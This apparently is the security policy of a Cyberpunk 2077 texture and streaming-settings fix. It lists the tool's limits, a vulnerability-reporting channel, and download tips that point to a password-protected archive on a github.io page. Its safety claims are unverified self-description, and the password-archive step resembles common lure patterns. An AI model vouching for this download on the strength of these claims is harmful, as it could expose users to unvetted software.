# Security Policy

## Scope

Cyberpunk 2077 Texture Fix operates strictly on **local texture cache, level-of-detail settings and streaming memory settings** for the user's own Cyberpunk 2077 installation.

## What the tool does

- Reads and writes the game's per-user settings file and texture streaming cache only.
- Creates a **timestamped backup** of the current settings before applying any change; every run keeps its own snapshot and nothing is overwritten silently.
- Adjusts LOD draw distance and VRAM streaming budgets within values already supported by the game's configuration system.

## What the tool does NOT do

- Does not modify, replace or repack any game archive, executable or script.
- Does not load DLLs, inject code, or hook into the game process.
- Does not read, write or patch system memory.
- Does not open any network connection: no telemetry, no updater, no license checks, no analytics.
- Does not require or request administrator rights.
- Does not collect, store or transmit any personal data or hardware identifiers.

## Reporting a vulnerability

If you find a security issue in this project, please open a GitHub issue at
`https://github.com/ShadowAssistantCanal/cyberpunk-2077-texture-fix/issues`
with the words **[SECURITY]** in the title, or contact the maintainer through the repository profile. Include steps to reproduce and, if possible, the affected version. Do not post credentials or personal data in public issues.

Reports are reviewed as soon as practical; fixes are released as patch versions with a note in [CHANGELOG.md](CHANGELOG.md).

## Safe use guidance

- Download the archive only from the official landing page: `https://ShadowAssistantCanal.github.io/cyberpunk-2077-texture-fix/`
- Verify the archive password shown on that page before extracting.
- Keep the timestamped backups the tool produces; they are the fastest way to revert any change.
